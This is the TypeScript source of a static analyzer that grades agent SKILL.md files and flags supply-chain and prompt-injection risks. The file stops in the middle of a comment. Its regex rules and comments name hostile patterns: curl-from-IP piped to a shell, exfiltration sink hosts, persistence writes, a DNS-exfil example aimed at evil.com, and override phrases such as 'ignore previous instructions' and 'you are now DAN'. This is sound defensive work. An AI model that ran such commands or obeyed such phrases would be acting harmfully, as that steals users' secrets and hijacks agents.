/**
 * analyzeSkill — a real, deterministic static analyzer for a SKILL.md file.
 *
 * Runs entirely in the browser with no model call. Every signal below is a
 * *fact computed from the pasted text* (does it have frontmatter? how many
 * tokens? does it contain `curl | sh`? does it say "ignore previous
 * instructions"?). It is a HYGIENE / lint score, not a measured task-success
 * score — see docs/detection-strategy.md for what static analysis can and
 * cannot prove, and where the real (execution-based) product goes deeper.
 *
 * The risk rules operationalize documented real-world failure modes:
 *  - Snyk "ToxicSkills" (Feb 2026): 36.8% of audited skills carry a security
 *    flaw; 91% of malicious skills use prompt injection.
 *  - OWASP Agentic Skills Top 10 categories (shell exec, secret access,
 *    egress, injection, obfuscation).
 */

import { scanScripts, type CapabilityHit } from './scriptScan'

export type Severity = 'critical' | 'high' | 'medium' | 'low'
export type RiskLevel = 'low' | 'medium' | 'high' | 'critical'
export type Gate = 'pass' | 'review' | 'block'
export type AxisKey = 'structure' | 'trigger' | 'tokens' | 'risk'

export interface Finding {
  severity: Severity
  category: string
  title: string
  detail: string
}

export type FindingKind = 'threat' | 'capability' | 'quality'
const THREAT_CATS = new Set(['injection', 'persistence', 'obfuscation'])
const CAPABILITY_CATS = new Set(['secret', 'egress', 'shell', 'privilege', 'destructive'])
/**
 * DECLARED-vs-MEASURED split for a finding (docs/knowledge-system.md L2 / P4).
 * A 'capability' is something the skill DECLARES it can do (reads a key, calls the
 * network, runs shell, deletes files) — disclosure, NOT proof of intent, so it caps
 * at REVIEW. A 'threat' is a MEASURED malice signal (an exfil chain, prompt
 * injection, a persistence backdoor, decode-and-run) or ANY critical finding —
 * that's what blocks. 'quality' is a FIXABLE DEFECT: structure/trigger/token, plus
 * `hygiene` (a hardcoded credential) — mistakes with a right answer we can point at,
 * as opposed to a capability, which has nothing to fix.
 * Pure + gate/grade-neutral: this only makes "why is this flagged" honest and
 * legible (capability ≠ intent), it never changes a gate, grade, or score.
 */
export function findingKind(f: { category: string; severity: string }): FindingKind {
  if (f.severity === 'critical') return 'threat'
  if (THREAT_CATS.has(f.category)) return 'threat'
  // 'exfil' is emitted at TWO different meanings: a MEASURED theft chain (critical/
  // high → threat, caught above) and a medium "verify the destination" note that is
  // merely secret ∧ egress restated — the benign API-client shape. The latter is a
  // DISCLOSURE, so it must not wear a red "threat" badge.
  if (f.category === 'exfil') return f.severity === 'high' ? 'threat' : 'capability'
  if (CAPABILITY_CATS.has(f.category)) return 'capability'
  return 'quality'
}

export interface Axis {
  key: AxisKey
  label: string
  score: number // 0–100
  note: string
}

// The static-detection rubric version. Bump when any axis formula / weight /
// threshold changes → every grade re-stamps and old grade vectors stay pinned to
// the rubric that produced them (CVSS-style versioned scoring). Single source of
// truth — the site + reports import this, they don't redefine it.
export const RUBRIC_VERSION = 'skillmoo-static/2.0'

/**
 * QUALITY weights — "how well is this skill BUILT?". They sum to 1 and cover the
 * three axes a text edit can actually move.
 *
 * RISK IS DELIBERATELY NOT AVERAGED IN (weight 0) — it is a SUBTRACTIVE penalty,
 * see `overallFrom`. Rubric 1.0 averaged risk at 0.40, which had two fatal effects:
 *
 *  1. For the ~95% of skills with no threat, risk sat at a near-constant → it fed
 *     40 points of pure dilution into every grade and compressed the axes that
 *     actually carry information (a skill with a useless trigger of 30 still graded B).
 *  2. Because rubric 1.0 also charged for benign CAPABILITY, an API-client skill's
 *     risk pinned at 58 — so `0.18·100 + 0.24·100 + 0.18·100 + 0.40·58 = 83.2` meant
 *     **A was mathematically unreachable for any skill that reads a key and calls an
 *     API**, no matter how well written. That is a category bias, not a quality
 *     judgement, and it is what made "one-click optimize" unable to ever land.
 *
 * Subtracting instead means: a clean skill is graded purely on craft, and a real
 * threat/hygiene defect bites at full strength rather than being diluted to 40%.
 */
export const AXIS_WEIGHTS: Record<AxisKey, number> = { structure: 0.25, trigger: 0.45, tokens: 0.3, risk: 0 }
const AXIS_ORDER: AxisKey[] = ['structure', 'trigger', 'tokens', 'risk']

/**
 * THE single source of truth for the overall score:
 *   overall = (structure·0.25 + trigger·0.45 + tokens·0.30) − (100 − risk)
 * i.e. craft, minus what the skill does wrong. Pure → provably reproducible.
 */
export function overallFrom(axes: Record<AxisKey, number>): number {
  const quality =
    axes.structure * AXIS_WEIGHTS.structure + axes.trigger * AXIS_WEIGHTS.trigger + axes.tokens * AXIS_WEIGHTS.tokens
  return clamp(quality - (100 - axes.risk))
}

/**
 * GRADE COST — what a finding costs the RISK axis.
 *
 * The risk axis answers "does this skill handle what it does RESPONSIBLY?", not
 * "what can it touch?". So it charges for THREAT (a measured malice signal) and for
 * HYGIENE (a real, fixable mistake like a hardcoded key), and charges NOTHING for
 * raw CAPABILITY. Reading a key from the runtime env and posting it to your own
 * API over https is the textbook-CORRECT way to write an API client — it is
 * disclosed in the capability manifest and surfaced by the gate, but it is not a
 * defect, and charging it points is what made A unreachable for every API skill.
 *
 * The security guarantee is untouched: the GATE (pass/review/block) is driven by the
 * findings themselves, never by this score — see the `level`/`gate` computation. A
 * capability pile still caps at REVIEW. A low grade never stopped an attacker; the
 * gate does. This only stops us charging honest skills for being useful.
 */
export const gradeCost = (f: { category: string; severity: Severity }): number => {
  // Only an ORDINARY capability is free — MEDIUM/LOW, i.e. the everyday shape of a
  // useful skill: a key read from the runtime env, an https call to its own API, a
  // scoped subprocess. A HIGH capability stays charged: private-key material or cloud
  // credentials are rare and high-impact, and "unusual + powerful" is a real quality
  // signal even without proof of intent. So this change can never weaken a grade that
  // rubric 1.0 got right — it only stops charging honest skills for being useful.
  if (findingKind(f) === 'capability' && (f.severity === 'medium' || f.severity === 'low')) return 0
  return SEV_WEIGHT[f.severity]
}

// How complete the evidence behind a grade was — the explicit "don't silently
// pass/fail" state (OpenSSF Scorecard's -1 analog). 'full' = the whole skill
// bundle was analyzed; 'partial' = only the SKILL.md was seen (a payload hidden in
// a bundled script / a dangling reference is INVISIBLE, so risk/structure are
// under-evidenced); 'empty' = no real content.
export type Evidence = 'full' | 'partial' | 'empty'

/**
 * A machine-readable, reproducible grade vector — the CVSS vector-string analog.
 * Anyone can re-derive the grade from `axes` + `weights` + `version` (via
 * recomputeScore / gradeFromScore), so a SkillMOO grade is independently
 * verifiable and appealable, never a black box.
 */
export interface GradeVector {
  version: string
  weights: Record<AxisKey, number>
  axes: Record<AxisKey, number>
  score: number
  grade: string
  gate: Gate
  critical: boolean
  /** false ⇒ no frontmatter/name, the agent can't register it → an F is "broken", not
   *  "avoid". A loadable skill floors at D. Carried so the grade stays reproducible. */
  loadable: boolean
  evidence: Evidence
  /** compact reproducible string, e.g. "SMV:2.0/S:92/T:78/K:88/R:100/O:88/G:A/GATE:P/E:full" */
  string: string
}

export interface SkillAnalysis {
  empty: boolean
  frontmatter: { name?: string; description?: string; hasFrontmatter: boolean }
  tokens: { total: number; description: number; body: number }
  axes: Axis[]
  risk: { level: RiskLevel; score: number }
  findings: Finding[]
  capabilities: CapabilityHit[]
  overall: { score: number; grade: string; gate: Gate; verdict: string }
  /** P0: machine-readable reproducible grade vector + honest evidence state. */
  vector: GradeVector
}

const clamp = (n: number, lo = 0, hi = 100) => Math.max(lo, Math.min(hi, Math.round(n)))

const GRADE_CUTS: Array<[number, string]> = [[85, 'A'], [72, 'B'], [58, 'C'], [42, 'D']]

/**
 * Grade from an overall score. A critical finding is disqualifying → F.
 *
 * And F on a public grade means "do not use" — honest for a BLOCKED, critical, or
 * UNLOADABLE skill (no frontmatter/name, so the agent literally can't register it), but
 * false for one the agent CAN load and that is safe: its worst honest grade is D
 * ("usable but has real defects"). No gold case grades a safe, registerable skill below
 * C, so a weak trigger + heavy size can drag a loadable skill to D — never to F.
 * `loadable` defaults true; pass false only for a genuinely unregisterable skill.
 */
export function gradeFromScore(score: number, critical = false, loadable = true): string {
  if (critical) return 'F'
  for (const [cut, g] of GRADE_CUTS) if (score >= cut) return g
  return loadable ? 'D' : 'F'
}

/** Re-derive the overall 0–100 score from axis subscores. Pure, so the grade vector
 *  is provably reproducible by any third party — it runs the exact same
 *  `overallFrom` the live path does (quality weights, minus the risk penalty). */
export function recomputeScore(axes: Record<AxisKey, number>): number {
  return overallFrom(axes)
}

const GATE_CH: Record<Gate, string> = { pass: 'P', review: 'R', block: 'B' }

/** Build the reproducible grade vector for an analysis's computed axes. */
export function makeVector(
  axes: Record<AxisKey, number>, score: number, grade: string, gate: Gate, critical: boolean, evidence: Evidence,
  loadable = true,
): GradeVector {
  const string =
    `SMV:${RUBRIC_VERSION.split('/').pop()}` +
    `/S:${axes.structure}/T:${axes.trigger}/K:${axes.tokens}/R:${axes.risk}` +
    `/O:${score}/G:${grade}/GATE:${GATE_CH[gate]}/E:${evidence}${critical ? '/X:1' : ''}${loadable ? '' : '/L:0'}`
  return { version: RUBRIC_VERSION, weights: AXIS_WEIGHTS, axes, score, grade, gate, critical, loadable, evidence, string }
}

/** Parse a grade-vector string and RE-DERIVE the score/grade from its axis
 *  subscores, so a third party can independently verify a published grade.
 *  `reproducible` is true iff the recomputed score+grade match the string. */
export function parseVector(s: string): {
  axes: Record<AxisKey, number>; score: number; grade: string; gate: Gate; evidence: Evidence; critical: boolean; loadable: boolean
  recomputedScore: number; recomputedGrade: string; reproducible: boolean
} | null {
  const get = (k: string) => { const m = s.match(new RegExp(`(?:^|/)${k}:([^/]+)`)); return m ? m[1] : null }
  const num = (k: string) => { const v = get(k); return v == null ? NaN : Number(v) } // missing → NaN, not 0
  const axes = { structure: num('S'), trigger: num('T'), tokens: num('K'), risk: num('R') }
  if (AXIS_ORDER.some((k) => Number.isNaN(axes[k]))) return null
  const score = num('O')
  const grade = get('G') ?? ''
  const gate = (Object.keys(GATE_CH) as Gate[]).find((g) => GATE_CH[g] === get('GATE')) ?? 'review'
  const evidence = (get('E') as Evidence) ?? 'full'
  const critical = get('X') === '1'
  const loadable = get('L') !== '0' // absent ⇒ loadable (the common case); '/L:0' ⇒ unregisterable
  const recomputedScore = recomputeScore(axes)
  // Mirror the engine's grade EXACTLY: a block is an F regardless of score, otherwise the
  // score→grade map with the same critical/loadable inputs. (Applying the block rule here
  // also fixes a pre-existing gap: a high-severity block with a passing score used to
  // recompute to a non-F grade and read as non-reproducible.)
  const recomputedGrade = gate === 'block' ? 'F' : gradeFromScore(recomputedScore, critical, loadable)
  return { axes, score, grade, gate, evidence, critical, loadable, recomputedScore, recomputedGrade, reproducible: recomputedScore === score && recomputedGrade === grade }
}

/**
 * Token estimate. Still approximate (the real product uses each model's exact
 * BPE), but CJK-aware: each CJK char ≈ 1 token, Latin/code ≈ 4 chars/token.
 */
export function estimateTokens(s: string): number {
  const t = s.trim()
  if (!t) return 0
  // CJK Unified + Hiragana/Katakana + Korean Hangul + CJK-compat + fullwidth.
  const cjk = (t.match(/[\u3000-\u9fff\uac00-\ud7a3\uf900-\ufaff\uff00-\uffef]/g) || []).length
  const rest = t.length - cjk
  return Math.max(0, Math.round(cjk * 1.05 + rest / 4))
}

/* ---------- Evasion-resistant normalization ---------- *
 * Attackers hide instructions with zero-width chars, homoglyphs, fullwidth
 * letters, or base64. We "remove the disguise" BEFORE pattern matching so the
 * risk rules see the true payload. This closes the base64 / zero-width /
 * homoglyph / fullwidth evasion gaps that plain regex misses.               */
// Invisible / directional control chars: soft-hyphen, zero-width (200B–200F),
// bidi embedding+override (202A–202E) AND isolates (2066–2069, the Trojan-Source
// reordering channel), word-joiner range (2060–2064), BOM. Stripped so a payload
// hidden or visually reordered by them surfaces to the rules as plain text.
const ZERO_WIDTH = /[­​-‏‪-‮⁠-⁤⁦-⁩﻿]/g

// Common Cyrillic / Greek look-alikes → ASCII (defeats homoglyph spoofing).
const HOMO_MAP: Record<string, string> = {
  а: 'a', е: 'e', ё: 'e', о: 'o', с: 'c', р: 'p', х: 'x', у: 'y', к: 'k', ѕ: 's',
  і: 'i', ј: 'j', м: 'm', н: 'h', т: 't', в: 'b', д: 'd', з: '3', л: 'n', г: 'r',
  А: 'A', В: 'B', Е: 'E', К: 'K', М: 'M', Н: 'H', О: 'O', Р: 'P', С: 'C', Т: 'T', Х: 'X', У: 'Y',
  ο: 'o', α: 'a', ε: 'e', ρ: 'p', ι: 'i', κ: 'k', ν: 'v', τ: 't', υ: 'u', χ: 'x',
}
const HOMO_RE = new RegExp(`[${Object.keys(HOMO_MAP).join('')}]`, 'g')

const b64decode: (s: string) => string =
  typeof atob === 'function' ? atob : () => ''

export function normalizeForScan(raw: string): string {
  let s = raw.replace(ZERO_WIDTH, '')
  try {
    s = s.normalize('NFKC') // folds fullwidth ｃｕｒｌ → curl, ligatures, etc.
  } catch {
    /* noop */
  }
  s = s.replace(HOMO_RE, (ch) => HOMO_MAP[ch] ?? ch)
  // Join bash line-continuations ("curl … \⏎ | sh") so a wrapped command can't
  // slip past a one-line rule.
  s = s.replace(/\\\r?\n[ \t]*/g, ' ')

  const decoded: string[] = []
  // Unicode Tags smuggling (U+E0000–E007F): invisible codepoints that encode
  // ASCII a model still reads. Decode to plaintext + strip so the payload
  // surfaces to the rules.
  if (/[\u{E0000}-\u{E007F}]/u.test(s)) {
    const tagged = (s.match(/[\u{E0020}-\u{E007E}]/gu) || []).map((ch) => String.fromCharCode(ch.codePointAt(0)! - 0xe0000)).join('')
    if (tagged.trim()) decoded.push(tagged)
    s = s.replace(/[\u{E0000}-\u{E007F}]/gu, '')
  }
  // Decode base64 (incl. url-safe -_) blobs and append so hidden instructions
  // surface to the rules.
  const re = /[A-Za-z0-9+/_-]{24,}={0,2}/g
  let m: RegExpExecArray | null
  while ((m = re.exec(s))) {
    if (m[0].length > 4096) continue // a legit hidden instruction is short; a huge blob is an asset/DoS, not a payload
    try {
      const d = b64decode(m[0].replace(/-/g, '+').replace(/_/g, '/'))
      if (/[ -~]{6,}/.test(d)) decoded.push(d)
    } catch {
      /* not valid base64 */
    }
  }
  return decoded.length ? `${s}\n[decoded] ${decoded.join(' ')}` : s
}

// Hosts that exist almost only to CAPTURE exfiltrated data — paste bins, request
// bins, tunnels, webhook catchers, OAST/interactsh, chat webhooks. Their mere
// presence in a distributed skill is a strong data-egress signal, and a malice
// co-signal that lets secret+egress escalate to a CRITICAL exfil verdict.
const KNOWN_SINK = /\b(?:webhook\.site|requestbin\.(?:com|net)|pipedream\.(?:net|com)|hookbin\.com|beeceptor\.com|smee\.io|ngrok(?:-free)?\.(?:io|app|dev)|pastebin\.com|paste\.ee|hastebin\.com|dpaste\.\w+|ghostbin\.\w+|privatebin\.\w+|paste\.rs|clbin\.com|transfer\.sh|0x0\.st|x0\.at|envs\.sh|file\.io|termbin\.com|tmp\.ninja|uguu\.se|glot\.io|ix\.io|sprunge\.us|rentry\.(?:co|org)|controlc\.com|tmpfiles\.org|catbox\.moe|litterbox\.catbox\.moe|anonfiles\.com|gofile\.io|burpcollaborator\.net|oast(?:ify)?\.(?:fun|site|live|online|pro|me|com)|interact\.sh|dnslog\.cn|ceye\.io|canarytokens\.\w+|discord(?:app)?\.com\/api\/webhooks|api\.telegram\.org\/bot|hooks\.slack\.com\/services)/i

export const SEV_WEIGHT: Record<Severity, number> = { critical: 52, high: 30, medium: 14, low: 6 }

interface Rule {
  re: RegExp
  severity: Severity
  category: string
  title: string
  detail: string
}

/**
 * Security / supply-chain rules. Ordered so the most dangerous compound
 * patterns match first. Kept intentionally simple (no nested quantifiers) to
 * avoid catastrophic backtracking.
 */
const RISK_RULES: Rule[] = [
  {
    // curl|sh from a RAW IP is unambiguous malice — no legitimate installer serves
    // from a bare IP address. This stays block-grade (critical).
    re: /\b(?:curl|wget)\b[^\n|]{0,120}\b(?:\d{1,3}\.){3}\d{1,3}\b[^\n|]{0,60}\|\s*(?:sudo\s+)?(?:sh|bash|zsh)\b/i,
    severity: 'critical',
    category: 'shell',
    title: 'Downloads and runs a remote script from a raw IP (curl <ip> | sh)',
    detail: 'Fetches a script from a bare IP address and runs it immediately — no legitimate installer does this. A classic supply-chain / malware-delivery shape with full machine control.',
  },
  {
    // Plain `curl … | sh` runs remote code, but the SOURCE can't be statically
    // verified — and it is ALSO the standard install method for uv, rustup,
    // Homebrew, nvm, deno, bun, ollama, … Blocking every tool-installer would
    // over-flag legitimate skills, so this is HIGH → REVIEW ("verify the source"),
    // not a hard block. Malicious variants stay block-grade elsewhere: a raw-IP
    // source (above), decode-then-pipe-to-shell, and reverse shells (scriptScan).
    re: /\b(?:curl|wget)\b[^\n|]{0,120}\|\s*(?:sudo\s+)?(?:sh|bash|zsh)\b/i,
    severity: 'high',
    category: 'shell',
    title: 'Downloads and runs a remote script (curl … | sh)',
    detail: 'Fetches a remote script and executes it immediately. Common for legitimate installers (uv, rustup, Homebrew…), but the source can’t be verified statically — confirm you trust the URL before running.',
  },
  {
    // Fires on: verb + (TEMPORAL/AUTHORITY qualifier + any instruction-noun) OR
    // (generic qualifier + STRONG noun). A generic qualifier (all/any/your/these)
    // paired with a WEAK noun (rule/guideline/constraint) is benign domain text —
    // "ignore all formatting rules", "template conventions override these guidelines"
    // — so it must NOT fire. Real injection is "ignore PREVIOUS instructions" /
    // "override SYSTEM prompt" / "ignore all INSTRUCTIONS". Separator-evasion
    // ([\s\-_.] so `ignore-all-previous-instructions` matches). Bounded → no ReDoS.
    re: /\b(?:ignore|disregard|forget|override|bypass)\b[\s\-_.a-z]{0,30}?(?:\b(?:previous|prior|above|earlier|preceding|system|initial)\b[\s\-_.a-z]{0,20}?\b(?:instruction|directive|rule|prompt|guideline|guidance|constraint|command)s?\b|\b(?:all|any|your|these)\b[\s\-_.a-z]{0,20}?\b(?:instruction|directive|prompt|command)s?\b)|\bforget\s+(?:everything|all\s+(?:previous|prior))\b/i,
    severity: 'critical',
    category: 'injection',
    title: 'Possible prompt injection / instruction hijack',
    detail: 'Contains "ignore previous instructions"-style text that can hijack the agent. 91% of malicious skills use exactly this.',
  },
  {
    // Explicit exfiltration INSTRUCTION: a natural-language imperative to send
    // SENSITIVE data to an external sink. The negative lookbehind (?<![\w.])
    // excludes method calls (`requests.post(`, `res.send(`, `client.upload(`),
    // so a benign REST client is never a false BLOCK (capability ≠ intent).
    //
    // The VERB "exfiltrate" is inherently malicious — but only with a data OBJECT.
    // The bare NOUN "exfiltration" is NOT: it appears constantly in DEFENSIVE /
    // educational text ("skills must not facilitate data exfiltration", "detects
    // data exfiltration") — Anthropic's own skill-creator says exactly that. So we
    // require exfiltrate(verb)+object, and rely on the behavioral chain / KNOWN_SINK
    // (below) to catch real theft in CODE — where malice is actually proven.
    re: /(?<![\w.])exfiltrat(?:e|es|ed|ing)\b[^.\n]{0,50}?\b(?:secret|password|passwd|token|api[_\s-]?keys?|access[_\s-]?keys?|credentials?|\.env\b|env\s+vars?|private[_\s-]?keys?|ssh\s+keys?|id_rsa|\.aws|clipboard|browsing\s+history|keychain|cookies?|data|files?|contents?|everything|information)\b|(?<![\w.])(?:send|post|upload|forward|transmit|leak|dump|copy|paste)\b[^.\n]{0,40}\b(?:secret|password|passwd|token|api[_\s-]?keys?|access[_\s-]?keys?|credentials?|\.env\b|env\s+vars?|private[_\s-]?keys?|ssh\s+keys?|id_rsa|\.aws|clipboard|browsing\s+history|keychain|cookies?)\b[^\n]{0,60}?(?:https?:\/\/|webhook|ngrok|pastebin|requestbin|interactsh|\.oast\.|discord\.com\/api\/webhooks|attacker|exfil|your\s+server|external\s+(?:server|host|endpoint|url))/i,
    severity: 'critical',
    category: 'exfil',
    title: 'Possible data-exfiltration intent',
    detail: 'Instructs the agent to send credentials/secrets to an external destination — a deliberate data-leak instruction, not a normal API call.',
  },
  {
    // Claude-Code dynamic context: a `!`command`` line in a SKILL.md runs on the
    // HOST before the model reasons about it — pre-model execution that skips the
    // model's safety checks. A documented in-the-wild credential-theft vector.
    re: /(?:^|[\n>\s])!`[^`\n]{1,300}`/,
    severity: 'high',
    category: 'shell',
    title: 'Runs a shell command before the model reads the skill (dynamic context)',
    detail: 'A `!`command`` line executes on your machine BEFORE the model even reads the skill (Claude Code dynamic context). Pre-model execution skips the model’s safety reasoning — a top vector for silent credential theft.',
  },
  {
    re: KNOWN_SINK,
    severity: 'high',
    category: 'egress',
    title: 'Sends data to a known exfiltration / paste / tunnel service',
    detail: 'References a service (webhook.site, requestbin, ngrok, pastebin, a Discord/Slack/Telegram webhook, an OAST/interactsh host…) that is almost only used to capture exfiltrated data — a strong data-egress signal.',
  },
  {
    // Persistence BACKDOOR: writes to a location that auto-runs or grants standing
    // access across sessions — near-never legitimate → block-grade.
    re: /(?:>>?|\btee\b|\bcp\b|\bmv\b|writeFileSync|fs\.write|open\([^\n]{0,40}["']w)[^\n]{0,80}(?:~\/\.(?:zshrc|bashrc|bash_profile|profile|zprofile|zshenv)|\/etc\/cron|\bcrontab\b|\.git\/hooks\/|authorized_keys|~\/\.ssh\/config|claude_desktop_config|mcp[_.]?(?:config|servers))/i,
    severity: 'high',
    category: 'persistence',
    title: 'Installs a persistence backdoor (auto-run / access file)',
    detail: 'Writes to a file that auto-runs or grants standing access across sessions (shell rc, crontab, git hooks, ~/.ssh/authorized_keys or config, MCP config). This is how a one-time skill becomes a permanent backdoor.',
  },
  {
    // Persistence into AGENT config → REVIEW (a memory/setup skill may legitimately
    // touch CLAUDE.md / .claude settings; a human decides).
    re: /(?:>>?|\btee\b|writeFileSync|fs\.write)[^\n]{0,80}(?:\bCLAUDE\.md|\bAGENTS\.md|\.claude\/settings|\.cursor\/rules|\.github\/copilot)/i,
    severity: 'medium',
    category: 'persistence',
    title: 'Writes to agent-config / instruction files',
    detail: 'Modifies CLAUDE.md / AGENTS.md / .claude settings — legitimate for a memory or setup skill, but also how a skill silently rewrites the agent’s standing instructions. Verify the intent.',
  },
  {
    // Claude-Code HOOK backdoor: a hook binds a shell `command` to a lifecycle event
    // (PreToolUse / PostToolUse / UserPromptSubmit / SessionStart / Stop …) so it
    // auto-runs on EVERY matching event with no per-run consent — the exact shape of
    // silent persistence. We flag the install MECHANISM at REVIEW (a legit skill may
    // wire a formatter/lint hook — capability ≠ intent, so never a false BLOCK); the
    // hook's COMMAND is scanned like any other code, so a malicious payload
    // (curl|sh, exec, reverse shell, exfil) still escalates to BLOCK on its own
    // content. Requires a lifecycle-event name adjacent to a `command` action so a
    // prose mention of "hooks" alone doesn't fire. Bounded [\s\S] span → no ReDoS.
    re: /["']?\b(?:PreToolUse|PostToolUse|UserPromptSubmit|SessionStart|SessionEnd|SubagentStop|PreCompact|Notification|Stop)\b["']?[\s\S]{0,200}?["']?\b(?:command|type)\b["']?\s*[:=]\s*["'][^\n]{0,4}(?:command|\$|`|\/|~|\.\/|sh\b|bash\b|python|node|curl|wget|eval|osascript)/i,
    severity: 'medium',
    category: 'persistence',
    title: 'Installs an auto-run Claude Code hook (command on a lifecycle event)',
    detail: 'Wires a shell command to a Claude Code lifecycle hook (PreToolUse / PostToolUse / SessionStart …) so it auto-runs on every matching event without asking. Legitimate for a formatter/lint setup skill, but also the classic silent-persistence backdoor — inspect exactly what command it runs before trusting it.',
  },
  {
    // Zero-click exfil: a markdown image/link whose query string interpolates a
    // dynamic value — the agent renders it and silently beacons data out, no click.
    re: /!\[[^\]]{0,80}\]\(\s*https?:\/\/[^)\s]{0,200}[?&][^)\s]{0,60}(?:\{\{|\$\{|\$\(|"\s*\+|\+\s*(?:secret|token|key|data|env|output|result))/i,
    severity: 'high',
    category: 'exfil',
    title: 'Zero-click data exfiltration via image/link URL',
    detail: 'A markdown image/link with a dynamic value interpolated into its query string — the agent renders it and silently sends the data to an external host, no click required.',
  },
  {
    // DNS-exfil covert channel: interpolating command output / a variable into a DNS
    // lookup (`dig $(cat secret).evil.com`, `nslookup $DATA.attacker.net`) smuggles
    // data out one subdomain at a time — it evades HTTP egress controls entirely and
    // is near-never legitimate. Requires a resolver command + a command-substitution
    // or shell var in the queried name so a static `dig example.com` never fires.
    // Review-grade (a monitoring skill might do `dig $(hostname).internal`); it
    // compounds with a secret read to the exfil chain. Bounded → no ReDoS.
    re: /\b(?:dig|nslookup|host|drill|kdig)\b[^\n]{0,40}(?:\$\((?:[^)\n]{1,60})\)|`[^`\n]{1,60}`|\$\{?[A-Za-z_]\w{0,40}\}?)[^\n]{0,40}\.[a-z0-9-]{1,40}\.[a-z]{2,20}\b/i,
    severity: 'medium',
    category: 'egress',
    title: 'Possible DNS-exfiltration covert channel',
    detail: 'Interpolates command output or a variable into a DNS lookup (dig / nslookup of `$(…).host`) — a covert channel that smuggles data out through subdomain queries and bypasses HTTP egress filtering. Rarely legitimate; a strong data-leak signal when it carries a secret.',
  },
  {
    // Over-privilege: the skill grants itself wildcard tool access.
    re: /allowed[_-]?tools\s*:[^\n]{0,120}(?:\bBash\s*\(\s*\*|\*\s*\)|:\s*\*(?:\s|$)|["']\s*\*\s*["'])/im,
    severity: 'medium',
    category: 'privilege',
    title: 'Over-broad allowed-tools grant',
    detail: 'The skill grants itself wildcard tool access (Bash(*) / allowed-tools: *) — far more privilege than a focused skill needs. Narrow it to the specific commands it actually uses.',
  },
  {
    // Concealment → REVIEW alone; paired with an injection/exec finding the
    // compound is already critical/block.
    re: /\b(?:do\s+not|don'?t|never)\b[\s\-_.a-z]{0,14}?\b(?:tell|inform|notify)\b[\s\-_.a-z]{0,14}?\b(?:the\s+)?(?:user|human)\b|\bhide\b[\s\-_.a-z]{0,20}?\b(?:from\s+the\s+user|your\s+actions?)\b/i,
    severity: 'medium',
    category: 'injection',
    title: 'Instruction to conceal actions from the user',
    detail: 'Tells the agent to hide what it does from the user — a hallmark of a malicious skill. On its own it may be benign phrasing; paired with an exec/exfil action it is a strong attack signal.',
  },
  {
    // System-prompt / context leakage (OWASP LLM07; the "Context Leakage" pattern
    // observed in real malicious skills). Instructing the agent to reveal its own
    // hidden system prompt / initial instructions exfiltrates privileged context.
    // Requires the reveal verb + the SPECIFIC target so a benign "print the results"
    // never fires. Bounded classes → no ReDoS.
    re: /\b(?:reveal|print|output|repeat|show|dump|disclose|echo|leak|send\s+me)\b[\s\-_.a-z]{0,24}?\b(?:your\s+|the\s+)?(?:system\s+(?:prompt|message)|(?:initial|hidden|prior|original|exact|full|entire|complete)\s+(?:instructions?|prompts?))\b|\brepeat\b[\s\-_.a-z]{0,16}?\b(?:everything|all\s+the\s+text|the\s+words)\s+above\b/i,
    severity: 'high',
    category: 'exfil',
    title: 'Instruction to leak the system prompt / hidden context',
    detail: 'Tells the agent to reveal its own system prompt / hidden initial instructions — an exfiltration of the agent’s privileged context (OWASP LLM07). Legitimate skills never need this.',
  },
  {
    // Behavior / decision poisoning (the "Behavior Manipulation" pattern in real
    // malicious skills): steering the agent to suppress its OWN safety judgment with
    // no "ignore instructions" trigger — "treat X as safe regardless", "never flag/
    // warn about dangerous commands", "auto-approve without asking". Scoped to
    // SAFETY/APPROVAL objects so a benign "always run prettier" does NOT fire.
    // REVIEW-grade (medium) alone — a legit skill may soften a specific warning; it
    // compounds to block only alongside an exec/exfil finding. Bounded → no ReDoS.
    re: /\b(?:treat|consider|mark|assume|regard)\b[\s\-_.a-z]{0,20}?\bas\s+safe\b[\s\-_.a-z]{0,24}?\b(?:even|regardless|no\s+matter|without\s+(?:checking|asking|verify))\b|\bnever\b[\s\-_.a-z]{0,12}?\b(?:flag|warn|block|question|verify|refuse|report|confirm)\b[\s\-_.a-z]{0,24}?\b(?:command|script|code|action|operation|danger\w*|risk\w*|destructive|unsafe)|\bauto(?:matically)?[- ]?(?:approve|accept|confirm|run)\b[\s\-_.a-z]{0,24}?\b(?:without\s+(?:asking|confirm|prompt|review)|no\s+confirm|skip\w*\s+(?:confirm|approv|review|prompt))/i,
    severity: 'medium',
    category: 'injection',
    title: 'Behavior manipulation — suppresses the agent’s safety judgment',
    detail: 'Steers the agent to override its own safety checks (“treat as safe regardless”, “never flag dangerous commands”, “auto-approve without asking”) without an explicit instruction-override. On its own a review flag; alongside an exec/exfil action it is a strong attack signal.',
  },
  {
    // Jailbreak / roleplay override (MITRE ATLAS AML.T0054): "you are now DAN",
    // "developer mode enabled", "no restrictions apply", "stay in character no matter
    // what". FP-guarded by requiring a jailbreak-specific token or a policy-negation
    // co-signal in the same clause, so a benign "stay in character" (fiction skill)
    // does NOT fire on its own. Bounded classes → no ReDoS.
    re: /\byou\s+are\s+now\b[\s\-_.a-z]{0,30}?\b(?:dan\b|do\s+anything\s+now|developer\s+mode|jailbr\w+|unrestricted|unfiltered|no\s+longer\s+bound)|\b(?:developer|god|dan)\s+mode\b[\s\-_.a-z]{0,20}?\b(?:enabled|activated|is\s+on|engaged)\b|\b(?:no|without|ignore|forget|drop)\b[\s\-_.a-z]{0,16}?\b(?:restrictions?|filters?|safety\s+(?:guideline|rule|check|guardrail)s?|content\s+polic\w+|guardrails?|ethical\s+guidelines?)\b[\s\-_.a-z]{0,20}?\b(?:appl\w+|anymore|now|from\s+now|whatsoever)\b|\bstay\s+in\s+character\b[\s\-_.a-z]{0,30}?\b(?:no\s+matter|regardless|even\s+if\s+asked|never\s+break)\b/i,
    severity: 'high',
    category: 'injection',
    title: 'Jailbreak / roleplay override (DAN / “no restrictions”)',
    detail: 'Contains a jailbreak/roleplay override ("you are now DAN", "developer mode enabled", "no restrictions apply", "stay in character no matter what") that strips the model’s safety guidelines — a hallmark of prompt-injection / model-evasion attacks.',
  },
  {
    // Authority / role spoofing (prompt-injection via forged conversation structure):
    // embedding a model's CHAT-TEMPLATE control tokens (ChatML `<|im_start|>`, Llama
    // `<<SYS>>` / `[INST]`, generic `<|system|>`) or a fake-authority header
    // (`[ADMIN OVERRIDE]`, `[SYSTEM OVERRIDE]`) into a SKILL.md forges a higher-
    // privilege message boundary so the injected text reads as a system/operator
    // instruction. These delimiters have no legitimate reason to appear in skill
    // prose (a prompt-format tutorial that shows them as an EXAMPLE is downgraded by
